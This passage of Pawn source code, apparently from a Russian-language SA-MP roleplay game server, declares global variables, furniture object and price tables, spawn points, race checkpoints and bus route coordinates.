new PlayerText:LRArrows[MAX_PLAYERS][3];
new pCurrentWeapon[MAX_PLAYERS];
new levelammo[MAX_PLAYERS];
//new badaboom;
new objectpost[46];
new spprog,sptur,sprab,spadmtur;
new furniture_pickup[MAX_PLAYERS];


new areagate[2],areagsp[4],areagatesp[3];
new dogsp[6];
new kol[MAX_PLAYERS];
new SpPes,SpGruz;
new RolikiSp;
new Trenag[MAX_PLAYERS], KTrenag[4];
new bool: down[MAX_PLAYERS];
new bool: usetre[8];
new HotDogBot[6];
new ArmyEat;
new Text3D:ArmyEatText;
new vehnpc,npcid = INVALID_PLAYER_ID,npcsp;
//new SportBot;

new texttimer;
new shevipic;
new Text3D:KaznaText;
new Text3D:HotDogText[6];
new Kazna,NalogTS,OplDom,OplBiz;
new PlayerText:CaptPl[MAX_PLAYERS][3];
new Paydah;
enum bagInfo
{
	bInvSlot[36],
	bInvKol[36],
	bBox,
	bWork,
	bMats,
	bDrugs,
	bMoney,
	bHeal,
	bLock
};
new BInfo[MAX_VEHICLES][bagInfo];
new BursirBot;

//open case
new Case[3];


new UtilBot;
new Text3D:UtilText;

new Text3D:BursirText;
new lvpdsp,lvpdsh,lvpdspveh;
new LicCost[5];
new DayCheck;
new ashshlag,ashsp;
new turmagate[2],arenagate[2],turmagatesp[2];
new fcpdgate[2],fcpdsp[2],fcpdsp1[2];
new regpic[3];
new regpic1[3];
new Float:objectzavod[8][10] = {
{2173.95093, 1609.85925, 999.46283, 2173.96606, 1609.82300, 1000.14099,   0.00000, 0.00000, 90.00000,180.0},
{2172.06689, 1609.86035, 999.46283, 2172.10864, 1609.82300, 1000.14099,   0.00000, 0.00000, 90.00000,180.0},
{2169.42236, 1612.80811, 999.46283, 2169.38037, 1612.75867, 1000.14099,   0.00000, 0.00000, 0.00000,90.0},
{2169.40894, 1614.70300, 999.46283, 2169.37988, 1614.72888, 1000.14099,   0.00000, 0.00000, 0.00000,90.0},
{2169.31299, 1622.76624, 999.46283, 2169.28613, 1622.75635, 1000.14099,   0.00000, 0.00000, 0.00000,90.0},
{2169.31299, 1624.64697, 999.46283, 2169.29297, 1624.67932, 1000.14099,   0.00000, 0.00000, 0.00000,90.0},
{2172.10718, 1627.49426, 999.46283, 2172.03589, 1627.44873, 1000.14099,   0.00000, 0.00000, 90.00000,0.0},
{2173.99512, 1627.50159, 999.46283, 2174.01538, 1627.44873, 1000.14099,   0.00000, 0.00000, 90.00000,0.0}
};
new Float:sa11738[12][13] = {
{/*11738*/ 2558.66772, -1291.83875, 1044.11475,/*11736*/2558.26611, -1292.06726, 1044.07581,/*11748*/ 2558.99878, -1292.02954, 1044.09595,/*Player*/2558.4714,-1291.0057,1044.1250,180.1232}, // 1
{/*11738*/ 2556.16748, -1291.79016, 1044.11475,/*11736*/2555.76636, -1292.03870, 1044.07581,/*11748*/ 2556.58765, -1291.95410, 1044.09595,/*Player*/2556.1521,-1291.0056,1044.1250,182.8805}, // 2
{/*11738*/ 2553.78662, -1291.80225, 1044.11475,/*11736*/2553.38452, -1292.03137, 1044.07581,/*11748*/ 2553.98779, -1292.04138, 1044.09595,/*Player*/2553.7424,-1291.0056,1044.1250,177.4911}, // 3
{/*11738*/ 2546.74146, -1291.75159, 1044.11475,/*11736*/2546.36499, -1292.10938, 1044.07581,/*11748*/ 2547.17236, -1291.99170, 1044.09595,/*Player*/2546.7639,-1291.0057,1044.1250,176.8018}, // 4
{/*11738*/ 2544.40674, -1291.71484, 1044.11475,/*11736*/2543.91553, -1292.12378, 1044.07581,/*11748*/ 2544.72461, -1292.04626, 1044.09595,/*Player*/2544.2825,-1291.0057,1044.1250,182.4419}, // 5
{/*11738*/ 2542.14600, -1291.75623, 1044.11475,/*11736*/2541.61304, -1292.07861, 1044.07581,/*11748*/ 2542.54907, -1291.93970, 1044.09595,/*Player*/2542.0374,-1291.0056,1044.1250,177.9925}, // 6
{/*11738*/ 2542.01416, -1295.08240, 1044.11475,/*11736*/2541.50928, -1294.81104, 1044.07581,/*11748*/ 2542.33374, -1294.79846, 1044.09595,/*Player*/2541.9565,-1295.8501,1044.1250,359.4768}, // 7
{/*11738*/ 2544.43701, -1295.10669, 1044.11475,/*11736*/2543.91089, -1294.85339, 1044.07581,/*11748*/ 2544.77197, -1294.92273, 1044.09595,/*Player*/2544.3357,-1295.8507,1044.1250,2.3596}, // 8
{/*11738*/ 2546.63965, -1295.13721, 1044.11475,/*11736*/2546.25586, -1294.85229, 1044.07581,/*11748*/ 2547.06152, -1294.85779, 1044.09595,/*Player*/2546.6980,-1295.8519,1044.1250,357.6595}, // 9
{/*11738*/ 2553.84619, -1295.04248, 1044.11475,/*11736*/2553.34424, -1294.75220, 1044.07581,/*11748*/ 2554.17725, -1294.82825, 1044.09595,/*Player*/2553.7241,-1295.8521,1044.1250,356.0929}, // 10
{/*11738*/ 2556.19824, -1295.08850, 1044.11475,/*11736*/2555.77832, -1294.77356, 1044.07581,/*11748*/ 2556.60669, -1294.80164, 1044.09595,/*Player*/2556.1572,-1295.8499,1044.1250,358.9756}, // 11
{/*11738*/ 2558.49268, -1295.12390, 1044.11475,/*11736*/2558.02271, -1294.78284, 1044.07581,/*11748*/ 2558.91431, -1294.81152, 1044.09595,/*Player*/2558.4644,-1295.8513,1044.1250,356.9076} // 12
};

// /*11738*/ /*11736*/ /*11748*/   /*Player*/

//    GONKA
//

/* 1. Кровати */new furniture_beds[]={11720,1700,1701,1745,1771,1793,1794,1795,1796,1797,1798,1799,1801,1802,1803,2090,2298,2299,2300,2301,2302,2563,2566,2575,14861,14446,2575};
/* 2. Столы */new furniture_table[]={1433,2370,2635,2637,2644,2747,2762,2763,2764,19997,2333,11691,11690,1737,1770,2029,2030,2031,2032,2109,2110,2111,2112,2117,2118,2184,2180,2173,2165,2180,2206,2205,2008,1999,1998};
/* 3. Стулья */new furniture_chairs[]={1663,1671,1714,1720,1721,19994,1739,1806,1810,1811,2079,2120,2121,2124,2125,2356,2636,2724,2776,2788,11734};
/* 4. Электроника */new furniture_electronics[]={1717,1718,1719,1747,1748,1749,1750,1751,1752,1781,1782,1783,1785,1786,1787,1788,1790,1791,1792,1840,2028,2099,2100,2102,2103,2104,2149,2186,2190,2192,2201,2202,2224,2225,2226,2227,2229,2230,2231,2232,2233,19893,19894,19807,11705,2596,14532,19920,11743};
/* 5. Кухня */new furniture_kitchen[]={19916,19915,19923,19933,2133,2134,2141,2158,2334,2335,2338,2341,2131,2132,2147,2336,2337,2339,2340,2139,2138,2137,2022,2018,2016,2015,2014};
/* 6. Шкафы и комоды */new furniture_chests[]={2576,2573,2574,2306,2307,2200,2167,2088,2087,2078,2025,2021};
/* 7. Санузел */new furniture_bathroom[]={2738,2602,2528,2527,2526,2525,2524,2523,2522,2521,2520,2519,2518,2517,2516,2515,2514};
/* 8. Диваны и кресла */new furniture_sofas[]={2748,2746,1746,1735,1729,1728,1727,1726,1724,1723,1711,1708,1705,1704,1562,11685,11684,11685,11683,1682,11717,2290};
/* 9. Картины */new furniture_picture[]={2289,2287,2286,2285,2284,2283,2282,2281,2280,2279,2278,2277,2276,2255,2256,2257,2258,2259,2260,2261,2262,2263,2264,2265,2267,2268,2269,2270,2271,2272,2273,2274,2275,19172,19173,19174,19175};
/* 10. Растения */new furniture_plants[]={625,626,627,628,630,631,632,646,2194,2195,2240,2241,2244,2245,2251,2252,2253,2811,15038};
/* 11. Остальное  */new furniture_others[]={19169,19609,11725,11724,11733,2614,14679};
//Карта лв,барабаны, камин 1, камин 2, лошадка, флаг, мини сцена, машинка для тату

/* 1. Кровати цена */new furniture_beds_price[]={270,150,150,155,155,155,158,158,155,158,158,160,160,160,162,165,180,185,187,190,195,210,215,215,300,300,220};
/* 2. Столы цена */new furniture_table_price[]={130,205,215,218,220,235,235,240,240,300,190,1100,1100,135,135,180,170,170,170,175,175,175,175,178,178,178,200,178,178,180,180,180,180,160,160};
/* 3. Стулья цена */new furniture_chairs_price[]={120,120,120,120,120,320,120,125,125,125,150,155,150,155,155,170,210,210,210,225,320};
/* 4. Электроника цена */new furniture_electronics_price[]={150,150,150,150,150,150,152,152,152,152,152,152,152,152,155,155,155,155,155,160,160,162,165,165,165,165,165,168,168,168,170,170,170,170,170,170,170,175,175,180,180,1750,400,400,1300,220,330,390,250};
/* 5. Кухня цена */new furniture_kitchen_price[]={310,310,320,320,185,185,185,185,190,190,190,195,185,185,185,195,195,195,200,180,180,180,175,175,175,175,170};
/* 6. Шкафы и комоды цена */new furniture_chests_price[]={210,213,213,215,215,200,190,180,180,180,175,175};
/* 7. Санузел цена */new furniture_bathroom_price[]={220,215,220,220,220,220,220,215,215,215,215,215,215,212,212,212,210};
/* 8. Диваны и кресла цена */new furniture_sofas_price[]={220,225,150,150,150,145,145,145,145,145,145,145,142,142,130,115,280,300,300,130,320,175};
/* 9. Картины цена */new furniture_picture_price[]={100,120,140,170,170,170,170,170,170,172,172,172,172,170,170,170,190,175,175,175,175,175,175,175,175,175,175,180,180,180,182,182,182,350,320,330,350};
/* 10. Растения цена */new furniture_plants_price[]={30,32,32,32,32,30,30,32,120,120,120,120,125,125,125,125,125,125,150};
/* 11. Остальное цена */new furniture_others_price[]={10,40,10,20,40,5,35};


enum at1
{
	Float:ax,
	Float:ay,
	Float:az,
	Float:aa
}
new Text3D:armytext;
new ActorInfo[MAX_ACTORS][at1];
enum at2
{
	aactor,
	Float:afa,
	Text3D:atext3d,
	azona,
	aid,
	atext1,
	Float:axx,
	Float:ayy,
	Float:azz,
	atext[50],
	aaniml[20],
	aanimn[20]
}
new ActorsInfo[MAX_ACTORS][at2];
new TOTALACTOS;
new antic;





new Text3D:MedicText;
new MedicBot,medicpic,medicpic1[2],hospic,picvz;
new Text3D:hostext,Text3D:hostext1,HosAp,HosAp1;
new biglet1ters[32][] = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y","Z","2", "3", "4", "5", "6", "7"};
enum stlinfo
{
	sPlayer[5],
	sDice[5],
	sIgra,
	sBet,
	sPrice,
	sJdet
}
new StolInfo[5][stlinfo];



enum gti
{
	Float:GangObj[6],
	Float:GangObj1[6]
};
static const  Float:gangtop[5][gti] = {
	{{ 2357.911132, -1705.094116, 14.023571, -0.000014, 0.000000, -89.999954},{ 2357.911132, -1705.104125, 14.013570, -0.000014, 0.000000, -89.999954}},
	{{ 2360.911132, -1705.094116, 14.023571, -0.000014, 0.000000, -89.999954},{ 2360.911132, -1705.104125, 14.013570, -0.000014, 0.000000, -89.999954}},
	{{ 2363.911132, -1705.094116, 14.023571, -0.000014, 0.000000, -89.999954},{ 2363.911132, -1705.104125, 14.013570, -0.000014, 0.000000, -89.999954}},
	{{ 2359.402587, -1705.094116, 13.423570, -0.000029, 0.000000, -89.999908},{ 2359.402587, -1705.104125, 13.413571, -0.000029, 0.000000, -89.999908}},
	{{ 2362.402587, -1705.094116, 13.423570, -0.000029, 0.000000, -89.999908},{ 2362.402587, -1705.104125, 13.413571, -0.000029, 0.000000, -89.999908}}
};

new bandobj[5][2];
enum SPAWNS_MAIN {
                SPAWNS_INT,
				SPAWNS_ROT,
				Float:SPAWNS_COORD[15]
};
static const Float:spawns_home[][SPAWNS_MAIN] = {
{5, 1, {140.2660,1366.1091,1083.8594, 146.22, 1370.60, 1088.88, 90.29, 150.48, 1369.94, 1087.42, 179.99, 147.53, 1365.93, 1082.84, -178.60}},
{9, 1, {260.8800,1237.2365,1084.2578, 265.11, 1244.29, 1084.66, 0.00, 259.88, 1251.31, 1083.26, 179.40, 259.28, 1244.85, 1083.24, 90.10}},
{6, 1, {234.1541,1063.7206,1084.2123, 230.47, 1075.58, 1084.63, 90.29, 247.58, 1070.70, 1083.16, -179.29, 228.92, 1082.39, 1083.17, -90.60}},
{15, 1, {327.9864,1477.7328,1084.4375, 319.15, 1489.26, 1084.94, 89.50, 331.73, 1491.73, 1083.37, 0.00, 326.82, 1482.91, 1083.42, -89.10}},
{2, 2, {2237.5413,-1081.1516,1049.04, 2245.97, -1071.10, 1049.54, -91.10, 2235.83, -1077.78, 1047.98, 89.49, 2240.32, -1075.27, 1047.98, 89.69}},
{10, 1, {24.0716,1340.1615,1084.3750, 36.18, 1344.86, 1084.95, -90.00, 29.34, 1344.14, 1083.38, 179.19, 24.39, 1346.59, 1083.39, 179.60}},
{10, 1, {2259.5068,-1135.9337,1050.6328, 2259.10, -1140.99, 1051.36, 91.90, 2268.40, -1137.24, 1049.61, 179.9, 2265.19, -1141.59, 1049.61, -90.10}},
{6, 2, {2196.8469,-1204.3524,1049.0234, 2197.36, -1202.26, 1049.71, -88.90, 2195.87, -1219.67, 1047.97, 89.99, 2186.14, -1200.84, 1048.01, 0.00}},
{9, 2, {2317.7983,-1026.7651,1050.2178, 2328.53, -1027.25, 1050.99, -179.00, 2321.53, -1017.31, 1049.17, -90.20, 2316.57, -1014.60, 1049.16, 179.79}},
{8, 1, {2365.3345,-1135.5907,1050.8826, 2358.36, -1129.66, 1051.51, 0.00, 2364.49, -1124.95, 1049.87, -179.79, 2368.10, -1130.41, 1049.86, 0.00}},
{11, 1, {2282.8831,-1140.0713,1050.8984, 2280.97, -1135.87, 1051.72, 89.69, 2282.86, -1133.64, 1049.89, 0.00, 2281.04, -1140.20, 1049.87, 178.20}},
{1, 2, {2218.3875,-1076.1580,1050.4844, 2206.38, -1078.68, 1051.07, -179.79, 2211.93, -1072.34, 1049.46, -90.00, 2213.87, -1078.31, 1049.47, -179.39}},
//{6, {-68.8411,1351.3397,1080.2109, 0.0, 0.0, 0.0, 0.0, 0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0}},
//{15, {-283.6001,1471.2211,1084.3750, 0.0, 0.0, 0.0, 0.0, 0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0}},
{8, 2, {-42.5525,1405.6432,1084.42971, -53.12, 1404.43, 1085.03, 89.89, -45.00, 1412.23, 1083.38, -89.79, -47.17, 1402.41, 1083.39, 0.00}},
{9, 1, {83.0791,1322.2808,1083.8662, 95.38, 1330.92, 1084.31, -89.19, 93.97, 1332.40, 1087.34, 179.99, 81.41, 1334.41, 1082.84, 179.69}},
{2, 1, {447.2238,1397.2926,1084.3047, 459.82, 1413.02, 1084.92,-89.30, 442.56, 1397.65, 1083.47, -178.39, 442.02, 1410.42, 1083.25,-90.49}},
{3, 1, {235.2748,1186.6809,1080.2578, 218.96, 1187.55, 1080.80, 90.40, 234.40, 1212.69, 1083.32, 0.00, 238.43, 1192.16, 1079.14, 88.9}},
{2, 2, {226.4436,1239.9277,1082.1406, 218.23, 1249.30, 1082.68, 90.49, 225.39, 1246.29, 1081.12, -91.10, 229.93, 1249.48, 1081.10, 0.00}},
{1, 1, {244.0883,305.0291,999.1484, 243.30, 302.50, 999.14, 90.99, 246.20, 306.64, 998.10, 0.00, 244.43, 306.59, 998.15, 0.00}},
{5, 2, {226.2956,1114.1615,1080.9929, 248.66, 1116.17, 1081.55, -89.89, 242.20, 1117.10, 1079.97, 88.40, 247.05, 1112.97, 1079.91, 179.89}},
//{15, {295.2479,1472.2650,1080.2578, 0.0, 0.0, 0.0, 0.0, 0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0}},
{4, 1, {261.1874,1284.2982,1080.2578, 258.46, 1294.73, 1081.04, 0.00, 257.27, 1285.60, 1079.24, 179.89, 253.81, 1289.65, 1079.25, 90.29}},
//{4, {-260.4934,1456.8430,1084.3672, 0.0, 0.0, 0.0, 0.0, 0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0}},
{5, 1, {22.9848,1403.3345,1084.4370, 27.94, 1418.63, 1085.00, 0.00, 17.78, 1403.35, 1083.41, 179.29, 25.08, 1405.02, 1083.43, 90.99}},
{2, 1, {2468.2080,-1698.2988,1013.5078, 2446.78, -1698.43, 1014.2, 89.50, 2455.74, -1706.73, 1012.46, -179.20, 2452.58, -1687.81, 1012.49, -90.19}},
//{2, {266.9498,304.9866,999.1484, 274.38, 306.31, 999.84, -88.99, 267.06, 307.24, 998.09, 45.70, 272.71, 307.90, 998.11, -45.49}},
{10, 1, {422.3438,2536.4980,10.0000, 415.50, 2539.48, 10.34, 89.39, 420.71, 2534.86, 8.98, 179.99, 414.26, 2535.09, 8.99, -179.29}},
{12, 1, {443.4504,509.2181,1001.4195, 451.33, 506.13, 1002.16, 179.89, 447.05, 506.59, 1000.37, -178.80, 452.31, 511.30, 1000.40, -89.90}},
{12, 2, {2324.3977,-1149.0601,1050.710, 2330.71, -1150.06, 1051.33, -179.39, 2335.07, -1141.83, 1053.25, 88.99, 2334.26, -1144.03, 1049.69, 179.80}},
{8, 2, {2807.6919,-1174.2933,1025.5703, 2813.30, -1166.71, 1026.21, -89.59, 2814.32, -1169.82, 1028.17, 89.60, 2816.84, -1173.65, 1024.52, 178.50}},
{5, 2, {2233.6965,-1115.1270,1050.8828, 2235.48, -1110.63, 1051.57,-89.79, 2235.48, -1112.78, 1049.87, -89.89, 2229.56, -1108.93, 1049.87,91.19}},
{4, 2, {221.7789,1140.1970,1082.6094, 218.45, 1160.49, 1083.11, 0.00, 229.26, 1153.24, 1081.53, -91.49, 224.04, 1156.68, 1081.58, 91.30}},
{15, 1, {387.1313,1471.7137,1080.1949, 377.13, 1461.99, 1080.18, 90.20, 378.36, 1469.47, 1079.23, 0.00, 385.01, 1461.16, 1079.17, -90.09}},
{15, 1, {377.1231,1417.3163,1081.3281, 371.64, 1420.39, 1081.94, -90.40, 359.53, 1418.34, 1080.31, 0.00, 69.74, 1427.21, 1080.31, 179.40}}
};

//SetPlayerAttachedObject(playerid, 5, 18638, 2, 0.157999, 0.028999, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.057001);
//========== GUN GAME
enum g1
{
	gName[24],
	gKills,
	gLevel
}
new InfoGG[9][g1];
new StartRegGG,StartTimeGG,InGameGG,check_gg,KolvIgGG;

new ggun[7] = {23,24,33,29,30,31,34};
// ============ KART BATTLE
new StartReg,StartTime,InGame,KolvoIg;
static const Float:vehspawn[14][4] = {
{-2702.0483,-282.4750,6.2847,314.2401}, // 1
{-2699.6670,-284.6315,6.2927,313.8293}, // 2
{-2704.9526,-285.1249,6.2849,313.5869}, // 3
{-2702.7351,-287.6454,6.2926,312.7462}, // 4
{-2707.6423,-287.6327,6.2848,313.4155}, // 5
{-2705.5063,-290.1387,6.2925,312.8385}, // 6
{-2710.0369,-289.9612,6.2847,312.3351}, // 1
{-2707.8723,-292.3005,6.2925,311.8349}, // 2
{-2712.3616,-292.0432,6.2925,313.0984}, // 3
{-2710.2188,-294.4630,6.2925,315.4231}, // 4
{-2714.8750,-294.3332,6.2907,313.0003}, // 5
{-2712.6643,-296.7390,6.2925,314.1530}, // 6
{-2717.2634,-296.5570,6.2891,313.2491}, // 7
{-2714.7917,-298.7037,6.2925,314.5433} // 8
};
new driftveh[14] = INVALID_VEHICLE_ID;
//new VehicleHorn[MAX_VEHICLES];
new winner = INVALID_PLAYER_ID;
static const Float:racech[32][3] = {
	{-2677.8889,-260.7612,6.1454}, // sas 1
	{-2654.8530,-212.5722,3.5501},
	{-2656.2107,-150.7847,3.2768},
	{-2654.0920,-71.6133,3.4331},
	{-2603.7952,-70.4099,3.5503},
	{-2604.6108,35.3472,3.5539},
	{-2652.5017,38.8515,3.4402},
	{-2654.7109,86.0588,3.3132},
	{-2605.9104,86.0434,3.5646},
	{-2561.7661,101.4080,8.2009},
	{-2539.3228,134.6997,15.6203},
	{-2526.6306,87.8429,20.6055},
	{-2485.3816,79.2909,24.7222},
	{-2486.1079,41.4616,26.0405},
	{-2501.7563,-0.7850,24.8628},
	{-2501.9272,-75.5666,24.8291},
	{-2502.3982,-129.3383,24.7222},
	{-2500.5898,-210.2249,24.7226},
	{-2427.8474,-195.7173,34.4251},
	{-2420.0320,-99.8997,34.4280},
	{-2421.0059,-17.8831,34.4254},
	{-2420.7227,90.0483,34.2745},
	{-2416.3154,186.2479,34.2742},
	{-2415.3054,277.3180,34.2724},
	{-2354.4119,372.5833,34.2690},
	{-2309.0044,417.7665,34.2655},
	{-2370.7693,503.8631,28.7584},
	{-2381.6670,563.8902,23.9956},
	{-2519.1458,567.7054,13.7157},
	{-2603.7910,568.7870,13.7111},
	{-2663.9351,569.5441,13.7144},
	{-2662.4106,606.3080,13.7059}
};
//============================
// =========== DIPLOMATIA
new DiploCheck[3][30] = {"{C9C7C7}[Нейтрал]{ffffff}","{20BA09}[Мир]{ffffff}","{F85A5A}[Война]{ffffff}"};
// ===============================
new Indicators_xqz[MAX_VEHICLES][6];

new Object[] = {978,1238,1237,1427,1237,2899,19948,19949,19950,19955,19956,19957,19966,19975,19983,19987,19992,19972};
new ObjectName[][] = {"Отбойник","Конус","Барьер №1","Барьер №2","Барьер №3","Шипы",
"Дорожный знак 'Поворот вправо запрещен'","Дорожный знак 'Поворот налево запрещен'","Дорожный знак 'Движение прямо запрещено'",
"Дорожний знак 'Движение налево'","Дорожний знак 'Движение направо'","Дорожный знак 'Движение прямо'","Дорождный знак 'STOP'",
"Дорожный знак 'Дорожные работы'","Дорожный знак 'Максимальная скорость 10'","Дорожный знак 'Максимальная скорость 30'"
,"Дорожный знак 'Максимальная скорость 55'","Дорожный знак 'Дорога закрыта'"};
new PlayerText:ExtP[16][MAX_PLAYERS];
new Text:Ext[16];
// ======================= МАРШРУТЫ АВТОБУСОВ ========================
static const Float:Gorodskoy3[52][4] = {
{2192.332763,1831.680664,10.463199,1.0}, // 0
{2191.688720,1846.242797,10.463199,0.0}, // 1
{2150.157958,1884.449829,10.322699,0.0}, // 2
{2143.538330,2042.822998,10.315199,0.0}, // 3
{2125.830322,2116.161865,10.314999,0.0}, // 4
{2125.498779,2032.744140,10.314599,0.0}, // 5
{2079.378173,2024.241088,10.314900,0.0}, // 6
{1953.011108,2023.936157,10.314999,0.0}, // 7
{1884.400756,2047.243286,10.314800,0.0}, // 8
{1736.487304,2056.377685,10.317799,0.0}, // 9
{1688.947753,2014.968994,10.314800,0.0}, // 10
{1594.870727,2016.439208,10.314800,0.0}, // 11
{1544.882202,1976.442504,10.314800,0.0}, // 12
{1405.645507,1975.432373,10.314900,0.0}, // 13
{1385.793823,1899.618896,10.314900,0.0}, // 14
{1346.319213,1876.112670,10.314900,0.0}, // 15
{1312.779296,1816.408569,10.305999,0.0}, // 16
{1241.276611,1816.184082,12.819499,0.0}, // 17
{1115.610717,1815.646118,10.313300,0.0}, // 18
{1032.730346,1814.986206,10.314999,0.0}, // 19
{1005.576416,1718.516479,10.416399,0.0}, // 20
{1004.359069,1491.631103,10.314999,0.0}, // 21
{1004.446228,1399.760375,10.318799,0.0}, // 22
{1050.682617,1371.321899,10.320500,0.0}, // 23
{1118.476440,1371.113647,10.314499,1.0}, // 24
{1155.195922,1371.083007,10.314800,0.0}, // 25
{1140.850708,1427.651855,5.462900,0.0}, // 26
{1165.697387,1395.018798,8.996800,0.0}, // 27
{1109.273925,1375.624511,10.314999,0.0}, // 28
{1009.235595,1409.556396,10.314599,1.0}, // 29
{1010.422729,1473.625976,10.314599,0.0}, // 30
{1010.015319,1627.460449,10.419400,0.0}, // 31
{1009.691101,1751.395629,10.416600,0.0}, // 32
{1033.667846,1810.972778,10.314900,0.0}, // 33
{1176.074462,1811.698364,11.640700,0.0}, // 34
{1307.734619,1811.532714,10.333800,0.0}, // 35
{1329.477416,1849.823364,10.314900,0.0}, // 36
{1449.915893,1871.479980,10.314900,0.0}, // 37
{1489.288818,1926.449584,10.314999,0.0}, // 38
{1523.625732,1970.113281,10.314999,0.0}, // 39
{1569.729370,1994.327392,10.314800,0.0}, // 40
{1642.027343,2011.171997,10.314399,0.0}, // 41
{1685.389404,2011.482177,10.314800,0.0}, // 42
{1708.650146,2038.547363,10.318900,0.0}, // 43
{1790.537719,2050.864501,10.471199,0.0}, // 44
{1888.851196,2041.886718,10.315199,0.0}, // 45
{1948.758789,2020.671875,10.314900,0.0}, // 46
{2060.838623,2020.595458,10.314999,0.0}, // 47
{2125.223388,1966.048583,10.341799,0.0}, // 48
{2101.100097,1803.060546,10.314800,0.0}, // 49
{2110.707519,1787.085815,10.315099,0.0}, // 50
{2164.828369,1830.975585,10.462499,1.0} // 51
};
static const Float:Gorodskoy2[57][4] ={
{1715.507568,1419.393920,10.134699,1.0}, // 0
{1740.136718,1450.933959,10.512399,0.0}, // 1
{1895.807250,1451.003295,10.314700,0.0}, // 2
{2025.789184,1451.666870,10.314800,0.0}, // 3
{2067.213378,1486.784423,10.315099,0.0}, // 4
{2070.409423,1607.288085,10.323300,0.0}, // 5
{2087.925048,1741.795410,10.315199,0.0}, // 6
{2131.765380,1827.600219,10.315299,0.0}, // 7
{2149.250244,1984.356811,10.322099,0.0}, // 8
{2148.534423,2167.031494,10.315400,0.0}, // 9
{2175.361083,2301.484375,10.311100,0.0}, // 10
{2172.005615,2347.323730,10.314700,0.0}, // 11
{2112.791259,2347.103027,10.314900,0.0}, // 12
{2092.660644,2314.801757,10.322199,0.0}, // 13
{2117.976562,2260.034667,10.317000,0.0}, // 14
{2126.276123,2116.885253,10.315299,0.0}, // 15
{2124.955078,1897.139892,10.315400,0.0}, // 16
{2092.035400,1792.483398,10.315199,0.0}, // 17
{1987.793090,1716.003417,10.315199,0.0}, // 18
{1857.680908,1716.236206,10.326199,0.0}, // 19
{1743.662841,1716.316284,10.759799,0.0}, // 20
{1666.793701,1716.328002,10.319199,0.0}, // 21
{1570.735229,1734.316650,10.314599,0.0}, // 22
{1569.786376,1815.859130,10.319600,0.0}, // 23
{1540.704711,1875.495971,10.314900,0.0}, // 24
{1400.823486,1875.031860,10.322500,0.0}, // 25
{1325.795654,1847.079101,10.314900,0.0}, // 26
{1312.088134,1815.812255,10.302399,0.0}, // 27
{1204.938232,1815.944335,13.270199,0.0}, // 28
{1085.913330,1815.682128,10.314999,0.0}, // 29
{1004.722412,1771.183349,10.416199,0.0}, // 30
{1005.423522,1570.956298,10.315299,0.0}, // 31
{1005.581176,1474.784301,10.314999,0.0}, // 32
{1032.341186,1371.186645,10.417300,0.0}, // 33
{1120.742553,1370.637695,10.314499,1.0}, // 34
{1155.011962,1370.160644,10.314900,0.0}, // 35
{1169.332153,1440.517822,5.463500,0.0}, // 36
{1150.677001,1458.824340,5.462900,0.0}, // 37
{1165.650878,1414.253051,6.592400,0.0}, // 38
{1166.069580,1386.447875,9.970399,0.0}, // 39
{1152.327026,1375.976562,10.314800,0.0}, // 40
{1061.848022,1375.970336,10.392499,0.0}, // 41
{1010.292114,1411.237915,10.293600,1.0}, // 42
{1009.608581,1640.870483,10.416500,0.0}, // 43
{1009.596313,1795.444335,10.315500,0.0}, // 44
{1106.782714,1811.500976,10.314999,0.0}, // 45
{1196.221069,1811.911499,12.998299,0.0}, // 46
{1273.759277,1811.630249,10.569199,0.0}, // 47
{1329.538574,1842.775756,10.314900,0.0}, // 48
{1363.370971,1869.852416,10.314900,0.0}, // 49
{1540.135864,1871.192993,10.314900,0.0}, // 50
{1564.329467,1815.348144,10.314599,0.0}, // 51
{1621.300170,1711.494873,10.315099,0.0}, // 52
{1689.207275,1711.324584,10.315099,0.0}, // 53
{1720.054199,1685.888061,10.239700,0.0}, // 54
{1734.593139,1628.085205,8.616499,0.0}, // 55
{1728.223022,1531.437622,10.310500,1.0} // 56
};

static const Float:Gorodskoy1[73][4] =
{
{2826.877197,1297.920532,10.410400,1.0}, // 0
{2813.101074,1265.999267,10.392800,0.0}, // 1
{2809.158447,1296.119628,10.392499,0.0}, // 2
{2772.892578,1314.977294,10.688699,0.0}, // 3
{2590.259277,1315.953613,10.314999,0.0}, // 4
{2488.955810,1315.471923,10.323599,0.0}, // 5
{2430.472900,1338.695312,10.314900,0.0}, // 6
{2397.803710,1375.437622,10.314800,0.0}, // 7
{2191.989013,1375.054565,10.406700,0.0}, // 8
{2083.675048,1375.598632,10.315600,0.0}, // 9
{2043.884887,1360.076538,10.314100,0.0}, // 10
{2045.433715,1203.706176,10.315099,0.0}, // 11
{2044.366821,1134.064575,10.315099,0.0}, // 12
{2005.958007,1095.999267,10.314900,0.0}, // 13
{1903.395141,1095.609008,10.317000,0.0}, // 14
{1870.561889,1112.155517,10.314800,0.0}, // 15
{1826.993408,1135.049560,12.434399,0.0}, // 16
{1726.482666,1135.532226,10.319999,0.0}, // 17
{1608.318969,1135.892456,10.314999,0.0}, // 18
{1500.687988,1134.678588,10.398699,0.0}, // 19
{1449.458374,1141.602905,10.314499,0.0}, // 20
{1435.636108,1194.853637,10.314900,0.0}, // 21
{1314.285400,1195.556396,10.314999,0.0}, // 22
{1181.006591,1194.845458,11.978699,1.0}, // 23
{1081.828613,1195.812988,10.292400,0.0}, // 24
{1008.971496,1336.141357,10.314200,0.0}, // 25
{1044.128051,1370.109985,10.314900,1.0}, // 26
{1119.986816,1370.107543,10.298999,0.0}, // 27
{1168.313964,1380.371948,10.314100,0.0}, // 28
{1169.281127,1423.694213,5.488299,0.0}, // 29
{1140.159545,1448.470092,5.463799,0.0}, // 30
{1151.628784,1429.672851,5.463200,0.0}, // 31
{1165.869995,1404.410034,7.822899,0.0}, // 32
{1161.434570,1377.422241,10.314200,0.0}, // 33
{1062.686035,1375.713134,10.405599,0.0}, // 34
{1023.695495,1375.120483,10.444100,0.0}, // 35
{1010.055908,1411.033813,10.314599,1.0}, // 36
{1008.945129,1471.770019,10.314499,0.0}, // 37
{1009.595886,1709.856201,10.422800,0.0}, // 38
{1009.572814,1836.280151,10.317299,0.0}, // 39
{1009.381469,2011.927490,10.315199,0.0}, // 40
{1009.681030,2236.729248,10.314700,0.0}, // 41
{1009.626586,2378.762207,10.290800,0.0}, // 42
